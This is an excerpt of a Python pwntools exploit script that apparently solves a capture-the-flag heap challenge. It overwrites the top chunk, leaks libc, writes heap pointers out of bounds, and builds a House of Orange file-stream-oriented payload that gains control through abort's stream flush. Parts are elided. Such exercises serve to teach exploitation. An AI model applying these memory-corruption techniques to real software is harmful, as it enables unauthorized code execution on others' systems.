...
def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            ...
            # scanf in menu
            b* 0x400c6d
            b* __GI__IO_vfscanf+2523
            b* _IO_file_doallocate+80
...
add(0x18, b'b'*8) # 0
edit(0, b'b'*0x18)
edit(0, b'\0'*0x18 + b'\xe1\x0f\x00') # overwrite top chunk
...
# Leak libc
# Before malloc(0x78) we scanf(choice) in menu, in scanf we have malloc(0x1000)
add(0x78, b'c'*8) # 1
view(1)
p.recvuntil(b'c'*8)
...
# OOB write heap pointer in global_size[]
for i in range(7): # 2 -> 8
    add(0x18, b'd'*8)

# FSOP with House of Orange
payload = flat(
...
# Trigger malloc_printerr: malloc -> malloc_printerr -> abort -> _IO_flush_all_lockp
time.sleep(0.5)
p.sendafter(b'choice :', str(1))
time.sleep(0.5)
p.sendafter(b'page :', str(10))
